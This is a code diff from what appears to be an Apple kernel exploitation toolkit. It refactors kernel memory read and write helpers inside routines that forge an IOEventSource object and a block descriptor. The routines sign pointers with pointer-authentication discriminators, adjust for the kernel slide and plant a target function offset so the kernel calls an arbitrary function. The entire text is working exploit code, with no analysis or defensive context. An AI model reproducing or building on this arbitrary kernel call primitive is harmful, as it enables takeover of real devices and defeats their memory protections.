@@ -64,11 +64,11 @@ uintptr_t xe_util_kfunc_sign_address(uintptr_t proc, uintptr_t address, uintptr_
 
 xe_util_kfunc_basic_t xe_util_kfunc_basic_create(uintptr_t proc, xe_util_zalloc_t io_event_source_allocator, xe_util_zalloc_t block_allocator, uint free_zone_idx) {
     uintptr_t free_zone = xe_util_zalloc_find_zone_at_index(free_zone_idx);
-    xe_assert(xe_kmem_read_uint64(free_zone) == 0);
+    xe_assert(xe_kmem_read_uint64(free_zone, 0) == 0);
     uintptr_t io_event_source = xe_util_zalloc_alloc(io_event_source_allocator);
     uintptr_t block = xe_util_zalloc_alloc(block_allocator);
     uintptr_t io_event_source_vtable = xe_util_kfunc_sign_address(proc, xe_slider_kernel_slide(VAR_IO_EVENT_SOURCE_VTABLE + 0x10), io_event_source, TYPE_IO_EVENT_SOURCE_MEM_VTABLE_DESCRIMINATOR);
-    uintptr_t block_descriptor = xe_util_kfunc_sign_address(proc, free_zone, KMEM_OFFSET(block, TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET), TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_DESCRIMINATOR);
+    uintptr_t block_descriptor = xe_util_kfunc_sign_address(proc, free_zone, block + TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET, TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_DESCRIMINATOR);
     
     xe_util_kfunc_basic_t util = malloc(sizeof(struct xe_util_kfunc_basic));
     util->block = block;
@@ -87,27 +87,27 @@ void xe_util_kfunc_setup_block_descriptor(xe_util_kfunc_basic_t util, uintptr_t 
     xe_assert(util->state == STATE_CREATED);
     int64_t diff = (target_func - xe_ptrauth_strip(util->block_descriptor) - TYPE_BLOCK_DESCRIPTOR_SMALL_MEM_DISPOSE_OFFSET);
     xe_assert(diff >= INT32_MIN && diff <= INT32_MAX);
-    xe_kmem_write_int32(KMEM_OFFSET(xe_ptrauth_strip(util->block_descriptor), TYPE_BLOCK_DESCRIPTOR_SMALL_MEM_DISPOSE_OFFSET), (int32_t)diff);
+    xe_kmem_write_int32(xe_ptrauth_strip(util->block_descriptor), TYPE_BLOCK_DESCRIPTOR_SMALL_MEM_DISPOSE_OFFSET, (int32_t)diff);
 }
 
 
 void xe_util_kfunc_setup_block(xe_util_kfunc_basic_t util, char arg0[8]) {
     xe_assert(util->state == STATE_CREATED);
     int32_t flags = (BLOCK_SMALL_DESCRIPTOR | BLOCK_NEEDS_FREE | BLOCK_HAS_COPY_DISPOSE) + 2;
-    xe_kmem_write(util->block, arg0, 8);
-    xe_kmem_write_int32(KMEM_OFFSET(util->block, TYPE_BLOCK_LAYOUT_MEM_FLAGS_OFFSET), flags);
-    xe_kmem_write_uint64(KMEM_OFFSET(util->block, TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET), util->block_descriptor);
+    xe_kmem_write(util->block, 0, arg0, 8);
+    xe_kmem_write_int32(util->block, TYPE_BLOCK_LAYOUT_MEM_FLAGS_OFFSET, flags);
+    xe_kmem_write_uint64(util->block, TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET, util->block_descriptor);
 }
 
 
 void xe_util_kfunc_setup_event_source(xe_util_kfunc_basic_t util) {
     xe_assert(util->state == STATE_CREATED);
     uintptr_t event_source = util->io_event_source;
-    xe_kmem_write_uint64(KMEM_OFFSET(event_source, TYPE_OS_OBJECT_MEM_VTABLE_OFFSET), util->io_event_source_vtable);
+    xe_kmem_write_uint64(event_source, TYPE_OS_OBJECT_MEM_VTABLE_OFFSET, util->io_event_source_vtable);
     uint32_t ref_count = 1 | (1ULL << 16);
-    xe_kmem_write_uint32(KMEM_OFFSET(event_source, TYPE_OS_OBJECT_MEM_RETAIN_COUNT_OFFSET), ref_count);
-    xe_kmem_write_uint64(KMEM_OFFSET(event_source, TYPE_IO_EVENT_SOURCE_MEM_ACTION_BLOCK_OFFSET), util->block);
-    xe_kmem_write_uint32(KMEM_OFFSET(event_source, TYPE_IO_EVENT_SOURCE_MEM_FLAGS_OFFSET), 0x4);
+    xe_kmem_write_uint32(event_source, TYPE_OS_OBJECT_MEM_RETAIN_COUNT_OFFSET, ref_count);
+    xe_kmem_write_uint64(event_source, TYPE_IO_EVENT_SOURCE_MEM_ACTION_BLOCK_OFFSET, util->block);
+    xe_kmem_write_uint32(event_source, TYPE_IO_EVENT_SOURCE_MEM_FLAGS_OFFSET, 0x4);
 }
 
 
